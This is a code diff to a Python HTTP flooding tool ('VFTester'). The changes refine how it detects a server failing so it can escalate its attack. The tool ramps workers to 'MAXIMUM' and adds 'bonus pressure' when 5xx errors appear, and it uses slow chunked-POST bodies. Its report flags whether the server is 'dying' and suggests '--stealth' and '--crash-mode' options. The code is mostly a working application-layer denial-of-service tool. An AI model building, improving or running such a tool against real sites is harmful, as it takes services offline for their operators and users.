@@ -336,6 +336,10 @@ class Stats:
     ssr_render_hits: int = 0
     rts: deque = field(default_factory=lambda: deque(maxlen=50000))
     codes: Dict[int, int] = field(default_factory=dict)
+    # v5: Error type breakdown — distinguish client vs server errors
+    error_types: Dict[str, int] = field(default_factory=dict)  # err_name -> count
+    server_errors: int = 0   # 5xx responses (REAL server failures)
+    client_errors: int = 0   # Connection/Timeout errors (client-side or CDN)
     _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
     t0: float = 0
     t1: float = 0
@@ -364,9 +368,18 @@ class Stats:
 # ═══════════════════════════════════════════════════════════════════════════════
 
 class ServerHealthMonitor:
+    """v5: Fixed health monitor — distinguishes CLIENT errors from SERVER errors.
+    
+    Key insight: Connection errors (Timeout, ClientConnectorError, etc.) are
+    CLIENT-side problems (your internet, CDN rate-limiting connections). They do NOT
+    mean the server is dying. Only 5xx responses mean the server is struggling.
+    
+    OLD BUG: All failures were counted as server health degradation, causing
+    false "Server Dying" alerts when it was actually the client's internet failing.
+    """
     def __init__(self):
         self._rt_window: deque = deque(maxlen=200)
-        self._status_window: deque = deque(maxlen=200)
+        self._status_window: deque = deque(maxlen=200)  # (code, is_server_response)
         self._timeout_streak: int = 0
         self._health_history: deque = deque(maxlen=20)
         self._pressure_multiplier: float = 1.0
@@ -374,10 +387,15 @@ class ServerHealthMonitor:
         self.server_dying: bool = False
         self._baseline_rt: float = 0
         self._baseline_set: bool = False
+        self._client_error_rate: float = 0.0  # Track client-side error rate separately
+        self._server_5xx_rate: float = 0.0    # Track actual server error rate
 
     def record(self, result: HitResult):
         self._rt_window.append(result.rt)
-        self._status_window.append((result.code, result.ok))
+        # is_server_response = True only when we got an actual HTTP response from the server
+        is_server_response = result.code is not None
+        self._status_window.append((result.code, result.ok, is_server_response))
+        
         if result.err and ('Timeout' in (result.err or '') or 'Connect' in (result.err or '')):
             self._timeout_streak += 1
         else:
@@ -388,27 +406,69 @@ class ServerHealthMonitor:
 
     def calculate_health(self) -> float:
         if len(self._status_window) < 5: return 1.0
-        fails = sum(1 for _, ok in self._status_window if not ok)
-        error_score = max(0, 1.0 - (fails / len(self._status_window)) * 2)
+        
+        # ─── Count actual SERVER responses vs CLIENT errors ───
+        server_responses = [(code, ok) for code, ok, is_srv in self._status_window if is_srv]
+        client_errors = sum(1 for code, ok, is_srv in self._status_window if not is_srv)
+        total = len(self._status_window)
+        
+        # Client error rate (for informational purposes, NOT for health)
+        self._client_error_rate = client_errors / total if total > 0 else 0
+        
+        # ─── Only count SERVER responses for health ───
+        if not server_responses:
+            # No server responses at all — likely client internet issue, NOT server dying
+            # Return neutral health (don't trigger crash mode for client problems)
+            self._health_history.append(0.5)
+            return 0.5
+        
+        # Server-side failure rate (5xx responses)
+        server_5xx = sum(1 for code, ok in server_responses if code is not None and code >= 500)
+        self._server_5xx_rate = server_5xx / len(server_responses)
+        
+        # Server-side non-5xx failure rate (4xx etc)
+        server_fails = sum(1 for code, ok in server_responses if not ok)
+        server_fail_rate = server_fails / len(server_responses) if server_responses else 0
+        
+        # ─── Health calculation (ONLY based on server responses) ───
+        # 5xx errors are the strongest signal of server stress (weight: 50%)
+        se_score = max(0, 1.0 - self._server_5xx_rate * 3)
+        
+        # Response time degradation (weight: 30%)
         if self._rt_window and self._baseline_rt > 0:
             avg_rt = statistics.mean(list(self._rt_window)[-50:])
             rt_ratio = avg_rt / max(self._baseline_rt, 0.01)
             rt_score = max(0, 1.0 - (rt_ratio - 1.0) / 2.0)
         else:
             rt_score = 1.0
-        timeout_score = max(0, 1.0 - self._timeout_streak / 10.0)
-        server_errors = sum(1 for code, _ in self._status_window if code is not None and code >= 500)
-        se_score = max(0, 1.0 - (server_errors / len(self._status_window)) * 3)
-        health = error_score * 0.4 + rt_score * 0.3 + timeout_score * 0.2 + se_score * 0.1
+        
+        # Rate limiting (429) — mild signal that server is feeling pressure (weight: 10%)
+        rate_limited = sum(1 for code, ok in server_responses if code == 429)
+        rl_score = max(0, 1.0 - (rate_limited / len(server_responses)) * 2)
+        
+        # Server fail rate (non-5xx failures) (weight: 10%)
+        sf_score = max(0, 1.0 - server_fail_rate * 2)
+        
+        health = se_score * 0.50 + rt_score * 0.30 + rl_score * 0.10 + sf_score * 0.10
         self._health_history.append(health)
         return health
 
     def get_pressure_advice(self, cur: int, max_w: int, step: int) -> Tuple[str, int]:
         health = self.calculate_health()
-        avg_health = statistics.mean(self._health_history) if self._health_history else 1.0
         recent = self._health_history[-1] if self._health_history else 1.0
-        self.server_dying = (recent < 0.3 and self._timeout_streak > 3) or \
-                           (recent < 0.15 and len(self._status_window) > 20)
+        
+        # v5: Server dying is ONLY true when we have actual 5xx responses
+        # Client-side connection errors do NOT mean server is dying
+        self.server_dying = (self._server_5xx_rate > 0.2) or \
+                           (recent < 0.3 and self._server_5xx_rate > 0.05)
+        
+        # If client error rate is very high but no server errors, DON'T escalate
+        # — we're saturating our own internet, not the server
+        if self._client_error_rate > 0.7 and self._server_5xx_rate < 0.05:
+            # Client is struggling, not the server — REDUCE pressure
+            self.crash_mode_active = False
+            return "BACKOFF", 0  # Don't add more workers
+        
         if health < 0.3:
             self.crash_mode_active = True
             return "MAXIMUM", min(step * 5, max_w - cur)
@@ -740,7 +800,7 @@ class VFTester:
             try:
                 headers = self._base_headers()
                 headers["Content-Type"] = "application/x-www-form-urlencoded"
-                headers["Content-Length"] = str(random.randint(50000, 200000))
+                # v5 FIX: Don't set Content-Length with Transfer-Encoding: chunked (RFC 7230)
                 headers["Transfer-Encoding"] = "chunked"
                 
                 async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
@@ -991,13 +1051,13 @@ class VFTester:
                                        ssl=False, allow_redirects=False) as resp:
                     elapsed = time.time() - t
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
-                                      mode="api", hint=f"GQL {resp.status}", url=endpoint)
-                    await self.live_log.add("api", resp.status, elapsed, None, endpoint, result.hint)
+                                      mode="graphql", hint=f"GQL {resp.status}", url=endpoint)
+                    await self.live_log.add("graphql", resp.status, elapsed, None, endpoint, result.hint)
                     self.health_monitor.record(result)
             except Exception as e:
-                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api",
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="graphql",
                                   err=type(e).__name__, url=endpoint)
-                await self.live_log.add("api", None, result.rt, type(e).__name__, endpoint)
+                await self.live_log.add("graphql", None, result.rt, type(e).__name__, endpoint)
                 self.health_monitor.record(result)
             self._record(result)
             if not result.ok:
@@ -1027,8 +1087,8 @@ class VFTester:
                     body = await resp.text()
                     elapsed = time.time() - t
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
-                                      mode="page", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
-                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
+                                      mode="spa_route", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
+                    await self.live_log.add("spa_route", resp.status, elapsed, None, url, result.hint)
                     self.health_monitor.record(result)
             except Exception as e:
                 result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
@@ -1064,13 +1124,13 @@ class VFTester:
                     body = await resp.text()
                     elapsed = time.time() - t
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
-                                      mode="page", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
-                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
+                                      mode="ssr_render", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
+                    await self.live_log.add("ssr_render", resp.status, elapsed, None, url, result.hint)
                     self.health_monitor.record(result)
             except Exception as e:
-                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="ssr_render",
                                   err=type(e).__name__, url=url)
-                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
+                await self.live_log.add("ssr_render", None, result.rt, type(e).__name__, url)
                 self.health_monitor.record(result)
             self._record(result)
             if not result.ok:
@@ -1182,7 +1242,20 @@ class VFTester:
         self.stats._recent.append(r)
         if r.ok: self.stats.ok += 1
         else: self.stats.fail += 1
-        if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
+        if r.code is not None: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
+        # v5: Track rate limiting
+        if r.code == 429:
+            self.stats.rate_limited += 1
+        # v5: Track error types for breakdown report
+        if r.err:
+            self.stats.error_types[r.err] = self.stats.error_types.get(r.err, 0) + 1
+            # Distinguish client errors from server errors
+            if r.code is not None and r.code >= 500:
+                self.stats.server_errors += 1  # Real server failure
+            else:
+                self.stats.client_errors += 1  # Client-side (timeout, connection, etc.)
+        elif r.code is not None and r.code >= 500:
+            self.stats.server_errors += 1
         if r.mode == "login":
             if r.ok:
                 self.stats.login_ok += 1
@@ -1647,7 +1720,7 @@ class VFTester:
         try:
             headers = self._base_headers()
             headers["Content-Type"] = "application/x-www-form-urlencoded"
-            headers["Content-Length"] = str(random.randint(50000, 100000))
+            # v5 FIX: Don't set Content-Length with Transfer-Encoding: chunked (RFC 7230)
             headers["Transfer-Encoding"] = "chunked"
             
             async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
@@ -1786,7 +1859,7 @@ class VFTester:
         elif health > 0.4: hc = C.Y
         else: hc = C.R
 
-        mode_colors = {"RAMP": C.G, "NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}"}
+        mode_colors = {"RAMP": C.G, "NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}", "BACKOFF": C.CY}
         mc = mode_colors.get(mode, C.W)
         mode_display = f"{mc}{mode}{C.RS}"
 
@@ -1816,6 +1889,11 @@ class VFTester:
                 f"Step:+{step} every {step_dur}s | "
                 f"Next:{step_remaining:.0f}s | "
                 f"{C.DM}[+/-] Workers [q] Quit{C.RS}")
+
+        # v5: Client bottleneck warning
+        if self.health_monitor._client_error_rate > 0.6 and self.health_monitor._server_5xx_rate < 0.05:
+            cli_pct = self.health_monitor._client_error_rate * 100
+            line2 += f"\n  {C.Y}[!] CLIENT BOTTLENECK: {cli_pct:.0f}% connection errors — YOUR internet, not server!{C.RS}"
 
         # Breakdown
         bd_parts = []
@@ -1882,15 +1960,21 @@ class VFTester:
 
         await self.keyboard.start()
 
+        # v5: Smarter connection pool — cap at reasonable limits for real-world internet
+        # Old: limit=actual_max*2+1000 could create 21,000 connections which OS can't handle
+        # New: Cap at 2000 connections max, with DNS cache and keepalive
+        conn_limit = min(actual_max * 2, 2000)  # Never exceed 2000 connections
         connector = aiohttp.TCPConnector(
-            limit=actual_max * 2 + 1000,
+            limit=conn_limit,
             force_close=False,
             enable_cleanup_closed=True,
-            ttl_dns_cache=30,
+            ttl_dns_cache=60,       # Cache DNS longer to reduce DNS queries
             keepalive_timeout=30,
+            use_dns_cache=True,
         )
 
-        timeout = aiohttp.ClientTimeout(total=20)
+        # v5: Longer timeout for slow connections (Iran, etc.)
+        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=15)
 
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             # Pre-fetch if ASP.NET
@@ -1961,8 +2045,12 @@ class VFTester:
                 mode, worker_delta = self.health_monitor.get_pressure_advice(
                     cur, actual_max, self.step)
 
-                # Use the LARGER of auto-escalation step or health monitor advice
-                effective_delta = max(auto_step, worker_delta)
+                # v5 FIX: If BACKOFF mode (client internet saturated), DON'T add workers
+                if mode == "BACKOFF":
+                    effective_delta = 0
+                else:
+                    # Use the LARGER of auto-escalation step or health monitor advice
+                    effective_delta = max(auto_step, worker_delta)
 
                 # Manual delta
                 if self._manual_delta > 0:
@@ -1982,8 +2070,8 @@ class VFTester:
                         cur -= remove_count
                     self._manual_delta = 0
 
-                # Apply auto-escalation
-                if effective_delta > 0 and cur < actual_max:
+                # Apply auto-escalation (v5: respects BACKOFF mode)
+                if effective_delta > 0 and cur < actual_max and mode != "BACKOFF":
                     new = min(effective_delta, actual_max - cur)
                     if new > 0:
                         cur += new
@@ -1999,7 +2087,8 @@ class VFTester:
                             self._spawn_worker(session, all_tasks, vectors, pages, resources)
 
                 # Bonus pressure when 5xx detected in current step
-                if new_5xx > 0:
+                # v5 FIX: Skip bonus pressure in BACKOFF mode
+                if new_5xx > 0 and mode != "BACKOFF":
                     bonus = min(int(self.step * 0.5 * (1 + consecutive_5xx_steps)), actual_max - cur)
                     if bonus > 0:
                         cur += bonus
@@ -2014,7 +2103,7 @@ class VFTester:
                 while time.time() - step_t0 < self.step_duration and not self._stop.is_set():
                     health = self.health_monitor.health_score
                     trend = self.health_monitor.trend
-                    step_remaining = self.step_duration - (time.time() - step_t0)
+                    step_remaining = max(0, self.step_duration - (time.time() - step_t0))
                     line1, line2, line3, log_display = self._render_dashboard(
                         cur, actual_max, self.step, mode, health, trend,
                         self.step_duration, step_remaining, strategy,
@@ -2041,6 +2130,9 @@ class VFTester:
             if all_tasks:
                 done, pending = await asyncio.wait(all_tasks, timeout=3)
                 for t in pending: t.cancel()
+                # v5 FIX: Await cancelled tasks to prevent "Task destroyed but pending" warnings
+                if pending:
+                    await asyncio.gather(*pending, return_exceptions=True)
 
     def _snap(self):
         self._snaps.append({
@@ -2087,11 +2179,25 @@ def report(st: Stats, url: str, tester: VFTester):
     print(f"  +---------------------------------------------------+")
 
     # Crash Mode Summary
-    if tester.health_monitor.crash_mode_active:
+    if tester.health_monitor.crash_mode_active or tester.health_monitor.server_dying:
         print(f"\n  +-- {C.BD}{C.R}Crash Mode{C.RS} --------------------------------------------+")
         print(f"  | Final Health: {tester.health_monitor.health_score:.0%}")
         print(f"  | Trend:        {tester.health_monitor.trend}")
         print(f"  | Server Dying: {'YES' if tester.health_monitor.server_dying else 'NO'}")
+        if tester.health_monitor._server_5xx_rate > 0:
+            print(f"  | 5xx Rate:     {tester.health_monitor._server_5xx_rate:.1%}")
+        if tester.health_monitor._client_error_rate > 0.5:
+            print(f"  | Client Err:   {tester.health_monitor._client_error_rate:.1%} {C.Y}(your internet){C.RS}")
+        print(f"  +---------------------------------------------------+")
+    else:
+        # Always show health info
+        print(f"\n  +-- {C.BD}Server Health{C.RS} ------------------------------------------+")
+        print(f"  | Final Health: {tester.health_monitor.health_score:.0%}")
+        print(f"  | Trend:        {tester.health_monitor.trend}")
+        print(f"  | Server Dying: NO")
+        if tester.health_monitor._client_error_rate > 0.5:
+            print(f"  | Client Err:   {tester.health_monitor._client_error_rate:.1%} {C.Y}(your internet is the bottleneck){C.RS}")
+            print(f"  | {C.Y}Tip: Your connection is dropping requests, not the server. Try fewer workers.{C.RS}")
         print(f"  +---------------------------------------------------+")
 
     if st.codes:
@@ -2100,6 +2206,24 @@ def report(st: Stats, url: str, tester: VFTester):
             count = st.codes[code]
             cc = C.G if code < 300 else C.Y if code < 500 else C.R
             print(f"  | {cc}{code}{C.RS}: {count:,} ({count/st.total*100:.1f}%)")
+        print(f"  +---------------------------------------------------+")
+
+    # v5: Error type breakdown — crucial for understanding WHY requests fail
+    if st.error_types:
+        print(f"\n  +-- {C.BD}{C.Y}Error Breakdown{C.RS} ----------------------------------------+")
+        # Sort by frequency
+        for err_name, count in sorted(st.error_types.items(), key=lambda x: -x[1]):
+            pct = count / st.total * 100
+            # v5 FIX: Use same classification as _record() — code-based, not name-based
+            # Connection errors (code=None) are CLIENT errors, even if name contains "Server"
+            ec = C.Y  # Default: client-side (yellow)
+            print(f"  | {ec}{err_name:<35}{C.RS} {count:>6,} ({pct:.1f}%)")
+        print(f"  |")
+        print(f"  | {C.R}Server Errors (5xx):  {st.server_errors:,}{C.RS}  ← Real server failures")
+        print(f"  | {C.Y}Client Errors:        {st.client_errors:,}{C.RS}  ← Your internet / CDN dropping")
+        if st.client_errors > st.server_errors * 3 and st.server_errors == 0:
+            print(f"  | {C.BD}{C.Y}[!] HIGH CLIENT ERROR RATE! Your internet is the bottleneck, not the server.{C.RS}")
+            print(f"  | {C.BD}{C.Y}[!] Try: lower --max-workers, use --stealth, or use --crash-mode with fewer workers{C.RS}")
         print(f"  +---------------------------------------------------+")
 
     print(f"\n{'='*72}\n")
